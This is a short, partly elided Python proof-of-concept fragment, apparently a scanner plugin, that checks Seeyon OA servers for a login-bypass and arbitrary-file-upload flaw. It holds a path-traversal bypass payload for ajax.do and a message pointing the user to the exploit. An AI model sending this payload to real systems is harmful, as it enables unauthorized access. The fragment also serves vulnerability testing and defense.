...
class POC(pocs.Pocs):
    ...
    def __init__(self):
        ...
        # 根据漏洞的信息进行定义
        super().__init__()
        self.poc_name='致远oa_登录绕过漏洞&文件上传漏洞'
        self.vul_name='致远oa_登录绕过漏洞&文件上传漏洞'
        self.vul_num=''
        self.app_name='致远oa'
        self.app_version=''
        self.author='haochen'
        self.msg='ajax.do登录绕过&任意文件上传'
    ...
    def exploit(self,must_parameter,cho_parameter):
        ...
        self.payload='/seeyon/thirdpartyController.do.css/..;/ajax.do'
        if re.search('/$',url):
            url=url[0:len(url)-1]
        ...
        try:
            ...
            if 'java.lang.NullPointerException:null' in response.text:
                ...
                att_msg['msg'] = '存在wajax.do登录绕过&任意文件上传漏洞，请使用exploit进行攻击'
            else:
